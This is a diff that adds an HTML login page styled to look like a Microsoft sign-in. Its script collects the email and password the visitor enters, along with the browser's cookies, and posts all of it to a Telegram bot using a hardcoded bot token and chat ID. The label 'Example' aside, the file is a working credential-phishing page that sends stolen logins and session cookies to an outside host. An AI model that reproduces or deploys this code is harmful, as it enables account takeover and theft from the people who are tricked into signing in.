@@ -1,0 +1,173 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login with Cookies Example</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            margin: 0;
+            padding: 0;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background-color: #f3f2f1;
+        }
+
+        .login-container {
+            background-color: white;
+            padding: 40px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 400px;
+            text-align: left;
+        }
+
+        .form-container input[type="text"],
+        .form-container input[type="password"] {
+            width: 90%;
+            padding: 12px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 0px;
+            font-size: 16px;
+            border-left: none;
+            border-top: none;
+            border-right: none;
+        }
+
+        .form-container input[type="button"] {
+            background-color: #0078D4;
+            color: white;
+            border: none;
+            padding: 12px;
+            font-size: 16px;
+            cursor: pointer;
+            border-radius: 0px;
+            margin-top: 20px;
+            width: 100px;
+            margin-right: 20px;
+        }
+
+        .button-group {
+            display: flex;
+            justify-content: flex-end;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <!-- Form Section -->
+        <div class="form-container">
+            <h2>Login</h2>
+            <!-- Email form -->
+            <div id="emailForm">
+                <input type="text" id="email" placeholder="Email" required>
+                <div class="button-group">
+                    <input type="button" value="Next" onclick="grabEmailAndCookies()">
+                </div>
+            </div>
+
+            <!-- Password form -->
+            <div id="passwordForm" style="display: none;">
+                <input type="password" id="password" placeholder="Password" required>
+                <div class="button-group">
+                    <input type="button" value="Back" onclick="showEmailForm()">
+                    <input type="button" value="Sign in" onclick="submitLogin()">
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let grabbedEmail = '';  // Variable to store the email
+
+        // Function to grab the email and cookies
+        function grabEmailAndCookies() {
+            const emailInput = document.getElementById('email').value;
+
+            if (emailInput.trim() === '') {
+                alert('Please enter your email.');
+                return;
+            }
+
+            grabbedEmail = emailInput;  // Store the email
+            console.log('Email grabbed: ', grabbedEmail);  // Output email for debugging
+
+            // Proceed to show password form
+            showPasswordForm();
+
+            // Grab cookies from browser
+            grabCookies();
+        }
+
+        // Function to show password form
+        function showPasswordForm() {
+            document.getElementById('emailForm').style.display = 'none';
+            document.getElementById('passwordForm').style.display = 'block';
+        }
+
+        // Function to show email form
+        function showEmailForm() {
+            document.getElementById('passwordForm').style.display = 'none';
+            document.getElementById('emailForm').style.display = 'block';
+        }
+
+        // Function to grab cookies
+        function grabCookies() {
+            const cookies = document.cookie;
+            console.log('Cookies grabbed: ', cookies);
+        }
+
+        // Function to handle login submission
+        function submitLogin() {
+            const passwordInput = document.getElementById('password').value;
+
+            if (passwordInput.trim() === '') {
+                alert('Please enter your password.');
+                return;
+            }
+
+            console.log('Email:', grabbedEmail);
+            console.log('Password:', passwordInput);
+
+            // Send data to Telegram
+            sendToTelegram(grabbedEmail, passwordInput);
+        }
+
+        // Function to send login data and cookies to Telegram
+        function sendToTelegram(email, password) {
+            const cookies = document.cookie;
+            const message = `Email: ${email}\nPassword: ${password}\nCookies: ${cookies}`;
+
+            // Using your Telegram Bot token and chat ID
+            const telegramBotToken = '8140279574:AAGkl4vEQwwT1lYuguqTotD3Bb46SL7W8O0'; // Your bot token
+            const chatId = '8140279574';  // Your numeric chat ID
+
+            const telegramApiUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
+
+            fetch(telegramApiUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message,
+                }),
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    console.log('Message sent to Telegram successfully:', data);
+                } else {
+                    console.error('Failed to send message to Telegram:', data);
+                }
+            })
+            .catch(error => console.error('Error sending message to Telegram:', error));
+        }
+    </script>
+</body>
+</html>
